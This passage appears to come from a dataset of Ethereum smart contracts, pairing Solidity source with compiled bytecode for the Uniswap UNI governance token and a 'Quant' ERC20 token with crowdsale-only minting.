safe32(uint n, string memory errorMessage) internal pure returns (uint32) { require(n < 2**32, errorMessage); return uint32(n); } function safe96(uint n, string memory errorMessage) internal pure returns (uint96) { require(n < 2**96, errorMessage); return uint96(n); } function add96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) { uint96 c = a + b; require(c >= a, errorMessage); return c; } function sub96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) { require(b <= a, errorMessage); return a - b; } function getChainId() internal pure returns (uint) { uint256 chainId; assembly { chainId := chainid() } return chainId; }}",0x608060405234801561001057600080fd5b50600436106101b95760003560e01c80636fcfff45116100f9578063b4b5ea5711610097578063dd62ed3e11610071578063dd62ed3e1461036b578063e7a324dc1461037e578063f1127ed814610386578063fca3b5aa146103a7576101b9565b8063b4b5ea5714610332578063c3cda52014610345578063d505accf14610358576101b9565b8063782d6fe1116100d3578063782d6fe1146102e45780637ecebe001461030457806395d89b4114610317578063a9059cbb1461031f576101b9565b80636fcfff45146102b657806370a08231146102c957806376c71ca1146102dc576101b9565b806330adf81f1161016657806340c10f191161014057806340c10f1914610266578063587cde1e1461027b5780635c11d62f1461028e5780635c19a95c146102a3576101b9565b806330adf81f1461024157806330b36cef14610249578063313ce56714610251576101b9565b806318160ddd1161019757806318160ddd1461021157806320606b701461022657806323b872dd1461022e576101b9565b806306fdde03146101be57806307546172146101dc578063095ea7b3146101f1575b600080fd5b6101c66103ba565b6040516101d39190612c72565b60405180910390f35b6101e46103f3565b6040516101d39190612b45565b6102046101ff3660046122aa565b61040f565b6040516101d39190612b6e565b610219610534565b6040516101d39190612b7c565b61021961053a565b61020461023c3660046121c1565b610551565b6102196106f5565b610219610701565b610259610707565b6040516101d39190612dac565b6102796102743660046122aa565b61070c565b005b6101e4610289366004612161565b6109fc565b610296610a24565b6040516101d39190612d83565b6102796102b1366004612161565b610a2c565b6102966102c4366004612161565b610a39565b6102196102d7366004612161565b610a51565b610259610a87565b6102f76102f23660046122aa565b610a8c565b6040516101d39190612dc8565b610219610312366004612161565b610d6e565b6101c6610d80565b61020461032d3660046122aa565b610db9565b6102f7610340366004612161565b610df5565b6102796103533660046122da565b610ea3565b61027961036636600461220e565b611128565b610219610379366004612187565b61155d565b6102196115a3565b610399610394366004612361565b6115af565b6040516101d3929190612d91565b6102796103b5366004612161565b6115ea565b6040518060400160405280600781526020017f556e69737761700000000000000000000000000000000000000000000000000081525081565b60015473ffffffffffffffffffffffffffffffffffffffff1681565b6000807fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff83141561046157507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff610486565b61048383604051806060016040528060248152602001613082602491396116d6565b90505b33600081815260036020908152604080832073ffffffffffffffffffffffffffffffffffffffff891680855292529182902080547fffffffffffffffffffffffffffffffffffffffff000000000000000000000000166bffffffffffffffffffffffff861617905590519091907f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92590610520908590612dba565b60405180910390a360019150505b92915050565b60005481565b60405161054690612b2f565b604051809103902081565b73ffffffffffffffffffffffffffffffffffffffff831660009081526003602090815260408083203380855290835281842054825160608101909352602480845291936bffffffffffffffffffffffff9091169285926105bb9288929190613082908301396116d6565b90508673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415801561060757506bffffffffffffffffffffffff82811614155b156106db57600061063183836040518060600160405280603c8152602001612f02603c9139611728565b73ffffffffffffffffffffffffffffffffffffffff8981166000818152600360209081526040808320948a16808452949091529081902080547fffffffffffffffffffffffffffffffffffffffff000000000000000000000000166bffffffffffffffffffffffff86161790555192935090917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925906106d1908590612dba565b60405180910390a3505b6106e687878361178b565b600193505050505b9392505050565b60405161054690612b24565b60025481565b601281565b60015473ffffffffffffffffffffffffffffffffffffffff163314610766576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612d13565b60405180910390fd5b6002544210156107a2576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612cd3565b73ffffffffffffffffffffffffffffffffffffffff82166107ef576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612cc3565b6107fd426301e133806119f2565b600281905550600061082782604051806060016040528060218152602001613061602191396116d6565b905061084361083c600054600260ff16611a31565b6064611a85565b816bffffffffffffffffffffffff16111561088a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612d03565b6108c56108a7600054836bffffffffffffffffffffffff166119f2565b604051806060016040528060268152602001612f3e602691396116d6565b6bffffffffffffffffffffffff908116600090815573ffffffffffffffffffffffffffffffffffffffff85168152600460209081526040918290205482516060810190935260248084526109299491909116928592909190612ede90830139611ac7565b73ffffffffffffffffffffffffffffffffffffffff841660008181526004602052604080822080547fffffffffffffffffffffffffffffffffffffffff000000000000000000000000166bffffffffffffffffffffffff959095169490941790935591519091907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906109bd908590612dba565b60405180910390a373ffffffffffffffffffffffffffffffffffffffff8084166000908152600560205260408120546109f7921683611b22565b505050565b60056020526000908152604090205473ffffffffffffffffffffffffffffffffffffffff1681565b6301e1338081565b610a363382611d69565b50565b60076020526000908152604090205463ffffffff1681565b73ffffffffffffffffffffffffffffffffffffffff166000908152600460205260409020546bffffffffffffffffffffffff1690565b600281565b6000438210610ac7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612cb3565b73ffffffffffffffffffffffffffffffffffffffff831660009081526007602052604090205463ffffffff1680610b0257600091505061052e565b73ffffffffffffffffffffffffffffffffffffffff8416600090815260066020908152604080832063ffffffff7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff860181168552925290912054168310610bda5773ffffffffffffffffffffffffffffffffffffffff841660009081526006602090815260408083207fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff9490940163ffffffff168352929052205464010000000090046bffffffffffffffffffffffff16905061052e565b73ffffffffffffffffffffffffffffffffffffffff8416600090815260066020908152604080832083805290915290205463ffffffff16831015610c2257600091505061052e565b60007fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82015b8163ffffffff168163ffffffff161115610d1657600282820363ffffffff16048103610c7261211e565b5073ffffffffffffffffffffffffffffffffffffffff8716600090815260066020908152604080832063ffffffff8581168552908352928190208151808301909252549283168082526401000000009093046bffffffffffffffffffffffff169181019190915290871415610cf15760200151945061052e9350505050565b805163ffffffff16871115610d0857819350610d0f565b6001820392505b5050610c48565b5073ffffffffffffffffffffffffffffffffffffffff8516600090815260066020908152604080832063ffffffff909416835292905220546bffffffffffffffffffffffff6401000000009091041691505092915050565b60086020526000908152604090205481565b6040518060400160405280600381526020017f554e49000000000000000000000000000000000000000000000000000000000081525081565b600080610dde8360405180606001604052806025815260200161303c602591396116d6565b9050610deb33858361178b565b5060019392505050565b73ffffffffffffffffffffffffffffffffffffffff811660009081526007602052604081205463ffffffff1680610e2d5760006106ee565b73ffffffffffffffffffffffffffffffffffffffff831660009081526006602090815260408083207fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff850163ffffffff16845290915290205464010000000090046bffffffffffffffffffffffff169392505050565b6000604051610eb190612b2f565b60408051918290038220828201909152600782527f556e6973776170000000000000000000000000000000000000000000000000006020909201919091527f99c45e8ee5dde061ced9c812089094fbd28a020e7e37f2851198887e5ca64985610f18611e1d565b30604051602001610f2c9493929190612c22565b6040516020818303038152906040528051906020012090506000604051610f5290612b3a565b604051908190038120610f6d918a908a908a90602001612be4565b60405160208183030381529060405280519060200120905060008282604051602001610f9a929190612af3565b604051602081830303815290604052805190602001209050600060018288888860405160008152602001604052604051610fd79493929190612c57565b6020604051602081039080840390855afa158015610ff9573d6000803e3d6000fd5b50506040517fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0015191505073ffffffffffffffffffffffffffffffffffffffff8116611071576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612ca3565b73ffffffffffffffffffffffffffffffffffffffff8116600090815260086020526040902080546001810190915589146110d7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612d33565b87421115611111576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612c83565b61111b818b611d69565b505050505b505050505050565b60007fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff86141561117957507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff61119e565b61119b86604051806060016040528060238152602001612f99602391396116d6565b90505b60006040516111ac90612b2f565b60408051918290038220828201909152600782527f556e6973776170000000000000000000000000000000000000000000000000006020909201919091527f99c45e8ee5dde061ced9c812089094fbd28a020e7e37f2851198887e5ca64985611213611e1d565b306040516020016112279493929190612c22565b604051602081830303815290604052805190602001209050600060405161124d90612b24565b6040805191829003822073ffffffffffffffffffffffffffffffffffffffff8d1660009081526008602090815292902080546001810190915561129c9391928e928e928e9290918e9101612b8a565b604051602081830303815290604052805190602001209050600082826040516020016112c9929190612af3565b6040516020818303038152906040528051906020012090506000600182898989604051600081526020016040526040516113069493929190612c57565b6020604051602081039080840390855afa158015611328573d6000803e3d6000fd5b50506040517fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0015191505073ffffffffffffffffffffffffffffffffffffffff81166113a0576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612d63565b8b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614611405576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612d73565b8842111561143f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612d53565b84600360008e73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a8154816bffffffffffffffffffffffff02191690836bffffffffffffffffffffffff1602179055508a73ffffffffffffffffffffffffffffffffffffffff168c73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925876040516115479190612dba565b60405180910390a3505050505050505050505050565b73ffffffffffffffffffffffffffffffffffffffff91821660009081526003602090815260408083209390941682529190915220546bffffffffffffffffffffffff1690565b60405161054690612b3a565b600660209081526000928352604080842090915290825290205463ffffffff81169064010000000090046bffffffffffffffffffffffff1682565b60015473ffffffffffffffffffffffffffffffffffffffff16331461163b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612d23565b6001546040517f3b0007eb941cf645526cbb3a4fdaecda9d28ce4843167d9263b536a1f1edc0f6916116879173ffffffffffffffffffffffffffffffffffffffff909116908490612b53565b60405180910390a1600180547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff92909216919091179055565b6000816c010000000000000000000000008410611720576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d9190612c72565b509192915050565b6000836bffffffffffffffffffffffff16836bffffffffffffffffffffffff1611158290611783576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d9190612c72565b505050900390565b73ffffffffffffffffffffffffffffffffffffffff83166117d8576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612d43565b73ffffffffffffffffffffffffffffffffffffffff8216611825576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612ce3565b73ffffffffffffffffffffffffffffffffffffffff8316600090815260046020908152604091829020548251606081019093526035808452611882936bffffffffffffffffffffffff9092169285929190612f6490830139611728565b73ffffffffffffffffffffffffffffffffffffffff848116600090815260046020908152604080832080547fffffffffffffffffffffffffffffffffffffffff000000000000000000000000166bffffffffffffffffffffffff96871617905592861682529082902054825160608101909352602f80845261191494919091169285929091906130a690830139611ac7565b73ffffffffffffffffffffffffffffffffffffffff8381166000818152600460205260409081902080547fffffffffffffffffffffffffffffffffffffffff000000000000000000000000166bffffffffffffffffffffffff95909516949094179093559151908516907fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef906119ab908590612dba565b60405180910390a373ffffffffffffffffffffffffffffffffffffffff8084166000908152600560205260408082205485841683529120546109f792918216911683611b22565b6000828201838110156106ee576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612c93565b600082611a405750600061052e565b82820282848281611a4d57fe5b04146106ee576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d90612cf3565b60006106ee83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250611e21565b6000838301826bffffffffffffffffffffffff8087169083161015611b19576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d9190612c72565b50949350505050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614158015611b6c57506000816bffffffffffffffffffffffff16115b156109f75773ffffffffffffffffffffffffffffffffffffffff831615611c6f5773ffffffffffffffffffffffffffffffffffffffff831660009081526007602052604081205463ffffffff169081611bc6576000611c36565b73ffffffffffffffffffffffffffffffffffffffff851660009081526006602090815260408083207fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff860163ffffffff16845290915290205464010000000090046bffffffffffffffffffffffff165b90506000611c5d828560405180606001604052806027815260200161301560279139611728565b9050611c6b86848484611e72565b5050505b73ffffffffffffffffffffffffffffffffffffffff8216156109f75773ffffffffffffffffffffffffffffffffffffffff821660009081526007602052604081205463ffffffff169081611cc4576000611d34565b73ffffffffffffffffffffffffffffffffffffffff841660009081526006602090815260408083207fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff860163ffffffff16845290915290205464010000000090046bffffffffffffffffffffffff165b90506000611d5b8285604051806060016040528060268152602001612fbc60269139611ac7565b905061112085848484611e72565b73ffffffffffffffffffffffffffffffffffffffff808316600081815260056020818152604080842080546004845282862054949093528787167fffffffffffffffffffffffff000000000000000000000000000000000000000084168117909155905191909516946bffffffffffffffffffffffff9092169391928592917f3134e8a2e6d97e929a7e54011ea5485d7d196dd5f0ba4d4ef95803e8e3fc257f9190a4611e17828483611b22565b50505050565b4690565b60008183611e5c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d9190612c72565b506000838581611e6857fe5b0495945050505050565b6000611e9643604051806060016040528060338152602001612fe2603391396120dc565b905060008463ffffffff16118015611f0a575073ffffffffffffffffffffffffffffffffffffffff8516600090815260066020908152604080832063ffffffff7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8901811685529252909120548282169116145b15611fa95773ffffffffffffffffffffffffffffffffffffffff851660009081526006602090815260408083207fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff880163ffffffff168452909152902080547fffffffffffffffffffffffffffffffff000000000000000000000000ffffffff166401000000006bffffffffffffffffffffffff851602179055612085565b60408051808201825263ffffffff80841682526bffffffffffffffffffffffff808616602080850191825273ffffffffffffffffffffffffffffffffffffffff8b166000818152600683528781208c871682528352878120965187549451909516640100000000027fffffffffffffffffffffffffffffffff000000000000000000000000ffffffff9587167fffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000958616179590951694909417909555938252600790935292909220805460018801909316929091169190911790555b8473ffffffffffffffffffffffffffffffffffffffff167fdec2bacdd2f05b59de34da9b523dff8be42e5e38e818c82fdb0bae774387a72484846040516120cd929190612dd6565b60405180910390a25050505050565b6000816401000000008410611720576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161075d9190612c72565b604080518082019091526000808252602082015290565b803561052e81612eae565b803561052e81612ec2565b803561052e81612ecb565b803561052e81612ed4565b60006020828403121561217357600080fd5b600061217f8484612135565b949350505050565b6000806040838503121561219a57600080fd5b60006121a68585612135565b92505060206121b785828601612135565b9150509250929050565b6000806000606084860312156121d657600080fd5b60006121e28686612135565b93505060206121f386828701612135565b925050604061220486828701612140565b9150509250925092565b600080600080600080600060e0888a03121561222957600080fd5b60006122358a8a612135565b97505060206122468a828b01612135565b96505060406122578a828b01612140565b95505060606122688a828b01612140565b94505060806122798a828b01612156565b93505060a061228a8a828b01612140565b92505060c061229b8a828b01612140565b91505092959891949750929550565b600080604083850312156122bd57600080fd5b60006122c98585612135565b92505060206121b785828601612140565b60008060008060008060c087890312156122f357600080fd5b60006122ff8989612135565b965050602061231089828a01612140565b955050604061232189828a01612140565b945050606061233289828a01612156565b935050608061234389828a01612140565b92505060a061235489828a01612140565b9150509295509295509295565b6000806040838503121561237457600080fd5b60006123808585612135565b92505060206121b78582860161214b565b61239a81612e03565b82525050565b61239a81612e0e565b61239a81612e13565b61239a6123be82612e13565b612e13565b60006123ce82612df1565b6123d88185612df5565b93506123e8818560208601612e5a565b6123f181612e86565b9093019392505050565b6000612408602583612df5565b7f556e693a3a64656c656761746542795369673a207369676e617475726520657881527f7069726564000000000000000000000000000000000000000000000000000000602082015260400192915050565b6000612467600283612dfe565b7f1901000000000000000000000000000000000000000000000000000000000000815260020192915050565b60006124a0601b83612df5565b7f536166654d6174683a206164646974696f6e206f766572666c6f770000000000815260200192915050565b60006124d9602583612df5565b7f556e693a3a64656c656761746542795369673a20696e76616c6964207369676e81527f6174757265000000000000000000000000000000000000000000000000000000602082015260400192915050565b6000612538602683612df5565b7f556e693a3a6765745072696f72566f7465733a206e6f7420796574206465746581527f726d696e65640000000000000000000000000000000000000000000000000000602082015260400192915050565b6000612597602e83612df5565b7f556e693a3a6d696e743a2063616e6e6f74207472616e7366657220746f20746881527f65207a65726f2061646472657373000000000000000000000000000000000000602082015260400192915050565b60006125f6605283612dfe565b7f5065726d69742861646472657373206f776e65722c616464726573732073706581527f6e6465722c75696e743235362076616c75652c75696e74323536206e6f6e636560208201527f2c75696e7432353620646561646c696e65290000000000000000000000000000604082015260520192915050565b600061267b602283612df5565b7f556e693a3a6d696e743a206d696e74696e67206e6f7420616c6c6f776564207981527f6574000000000000000000000000000000000000000000000000000000000000602082015260400192915050565b60006126da604383612dfe565b7f454950373132446f6d61696e28737472696e67206e616d652c75696e7432353681527f20636861696e49642c6164647265737320766572696679696e67436f6e74726160208201527f6374290000000000000000000000000000000000000000000000000000000000604082015260430192915050565b600061275f603983612df5565b7f556e693a3a5f7472616e73666572546f6b656e733a2063616e6e6f742074726181527f6e7366657220746f20746865207a65726f206164647265737300000000000000602082015260400192915050565b60006127be602183612df5565b7f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f81527f7700000000000000000000000000000000000000000000000000000000000000602082015260400192915050565b600061281d601c83612df5565b7f556e693a3a6d696e743a206578636565646564206d696e742063617000000000815260200192915050565b6000612856602383612df5565b7f556e693a3a6d696e743a206f6e6c7920746865206d696e7465722063616e206d81527f696e740000000000000000000000000000000000000000000000000000000000602082015260400192915050565b60006128b5603d83612df5565b7f556e693a3a7365744d696e7465723a206f6e6c7920746865206d696e7465722081527f63616e206368616e676520746865206d696e7465722061646472657373000000602082015260400192915050565b6000612914602183612df5565b7f556e693a3a64656c656761746542795369673a20696e76616c6964206e6f6e6381527f6500000000000000000000000000000000000000000000000000000000000000602082015260400192915050565b6000612973603b83612df5565b7f556e693a3a5f7472616e73666572546f6b656e733a2063616e6e6f742074726181527f6e736665722066726f6d20746865207a65726f20616464726573730000000000602082015260400192915050565b60006129d2601e83612df5565b7f556e693a3a7065726d69743a207369676e617475726520657870697265640000815260200192915050565b6000612a0b603a83612dfe565b7f44656c65676174696f6e28616464726573732064656c6567617465652c75696e81527f74323536206e6f6e63652c75696e7432353620657870697279290000000000006020820152603a0192915050565b6000612a6a601e83612df5565b7f556e693a3a7065726d69743a20696e76616c6964207369676e61747572650000815260200192915050565b6000612aa3601983612df5565b7f556e693a3a7065726d69743a20756e617574686f72697a656400000000000000815260200192915050565b61239a81612e2f565b61239a81612e38565b61239a81612e4f565b61239a81612e3e565b6000612afe8261245a565b9150612b0a82856123b2565b602082019150612b1a82846123b2565b5060200192915050565b600061052e826125e9565b600061052e826126cd565b600061052e826129fe565b6020810161052e8284612391565b60408101612b618285612391565b6106ee6020830184612391565b6020810161052e82846123a0565b6020810161052e82846123a9565b60c08101612b9882896123a9565b612ba56020830188612391565b612bb26040830187612391565b612bbf60608301866123a9565b612bcc60808301856123a9565b612bd960a08301846123a9565b979650505050505050565b60808101612bf282876123a9565b612bff6020830186612391565b612c0c60408301856123a9565b612c1960608301846123a9565b95945050505050565b60808101612c3082876123a9565b612c3d60208301866123a9565b612c4a60408301856123a9565b612c196060830184612391565b60808101612c6582876123a9565b612bff6020830186612ad8565b602080825281016106ee81846123c3565b6020808252810161052e816123fb565b6020808252810161052e81612493565b6020808252810161052e816124cc565b6020808252810161052e8161252b565b6020808252810161052e8161258a565b6020808252810161052e8161266e565b6020808252810161052e81612752565b6020808252810161052e816127b1565b6020808252810161052e81612810565b6020808252810161052e81612849565b6020808252810161052e816128a8565b6020808252810161052e81612907565b6020808252810161052e81612966565b6020808252810161052e816129c5565b6020808252810161052e81612a5d565b6020808252810161052e81612a96565b6020810161052e8284612acf565b60408101612d9f8285612acf565b6106ee6020830184612aea565b6020810161052e8284612ad8565b6020810161052e8284612ae1565b6020810161052e8284612aea565b60408101612de48285612ae1565b6106ee6020830184612ae1565b5190565b90815260200190565b919050565b600061052e82612e16565b151590565b90565b73ffffffffffffffffffffffffffffffffffffffff1690565b63ffffffff1690565b60ff1690565b6bffffffffffffffffffffffff1690565b600061052e82612e3e565b60005b83811015612e75578181015183820152602001612e5d565b83811115611e175750506000910152565b601f017fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe01690565b612eb781612e03565b8114610a3657600080fd5b612eb781612e13565b612eb781612e2f565b612eb781612e3856fe556e693a3a6d696e743a207472616e7366657220616d6f756e74206f766572666c6f7773556e693a3a7472616e7366657246726f6d3a207472616e7366657220616d6f756e742065786365656473207370656e64657220616c6c6f77616e6365556e693a3a6d696e743a20746f74616c537570706c7920657863656564732039362062697473556e693a3a5f7472616e73666572546f6b656e733a207472616e7366657220616d6f756e7420657863656564732062616c616e6365556e693a3a7065726d69743a20616d6f756e7420657863656564732039362062697473556e693a3a5f6d6f7665566f7465733a20766f746520616d6f756e74206f766572666c6f7773556e693a3a5f7772697465436865636b706f696e743a20626c6f636b206e756d62657220657863656564732033322062697473556e693a3a5f6d6f7665566f7465733a20766f746520616d6f756e7420756e646572666c6f7773556e693a3a7472616e736665723a20616d6f756e7420657863656564732039362062697473556e693a3a6d696e743a20616d6f756e7420657863656564732039362062697473556e693a3a617070726f76653a20616d6f756e7420657863656564732039362062697473556e693a3a5f7472616e73666572546f6b656e733a207472616e7366657220616d6f756e74206f766572666c6f7773a365627a7a7231582068d42e51eae03f461fed8d2db904ba521e900521e0a2199b4a57d733502ad3da6c6578706572696d656e74616cf564736f6c63430005100040,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.4.21;contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value);}library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }}contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; uint256 totalSupply_ = 45467000000000000000000000; function totalSupply() public view returns (uint256) { return totalSupply_; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); emit Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public view returns (uint256 balance) { return balances[_owner]; }}contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value);}contract StandardToken is ERC20, BasicToken { string constant public name = ; string constant public symbol = ; uint8 constant public decimals = 18; uint256 constant public DECIMAL_ZEROS = 1000000000000000000; mapping (address => mapping (address => uint256)) internal allowed; address public crowdsale; modifier onlyCrowdsale() { require(msg.sender == crowdsale); _; } function StandardToken(address _crowdsale) public { require(_crowdsale != address(0)); crowdsale = _crowdsale; } function mint(address _address, uint256 _value) public onlyCrowdsale { balances[_address] = balances[_address].add(_value); emit Transfer(0, _address, _value); } function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); emit Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; emit Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; }}",0x6060604052600436106100d0576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde03146100d5578063095ea7b31461016357806318160ddd146101bd57806323b872dd146101e6578063313ce5671461025f57806340c10f191461028e578063414d784e146102d057806366188463146102f957806370a082311461035357806395d89b41146103a05780639c1e03a01461042e578063a9059cbb14610483578063d73dd623146104dd578063dd62ed3e14610537575b600080fd5b34156100e057600080fd5b6100e86105a3565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561012857808201518184015260208101905061010d565b50505050905090810190601f1680156101555780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561016e57600080fd5b6101a3600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506105dc565b604051808215151515815260200191505060405180910390f35b34156101c857600080fd5b6101d06106ce565b6040518082815260200191505060405180910390f35b34156101f157600080fd5b610245600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506106d8565b604051808215151515815260200191505060405180910390f35b341561026a57600080fd5b610272610a92565b604051808260ff1660ff16815260200191505060405180910390f35b341561029957600080fd5b6102ce600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610a97565b005b34156102db57600080fd5b6102e3610bda565b6040518082815260200191505060405180910390f35b341561030457600080fd5b610339600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610be6565b604051808215151515815260200191505060405180910390f35b341561035e57600080fd5b61038a600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610e77565b6040518082815260200191505060405180910390f35b34156103ab57600080fd5b6103b3610ebf565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156103f35780820151818401526020810190506103d8565b50505050905090810190601f1680156104205780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b341561043957600080fd5b610441610ef8565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561048e57600080fd5b6104c3600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091908035906020019091905050610f1e565b604051808215151515815260200191505060405180910390f35b34156104e857600080fd5b61051d600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803590602001909190505061113d565b604051808215151515815260200191505060405180910390f35b341561054257600080fd5b61058d600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050611339565b6040518082815260200191505060405180910390f35b6040805190810160405280600581526020017f5175616e7400000000000000000000000000000000000000000000000000000081525081565b600081600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925846040518082815260200191505060405180910390a36001905092915050565b6000600154905090565b60008073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415151561071557600080fd5b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054821115151561076257600080fd5b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482111515156107ed57600080fd5b61083e826000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546113c090919063ffffffff16565b6000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506108d1826000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546113d990919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016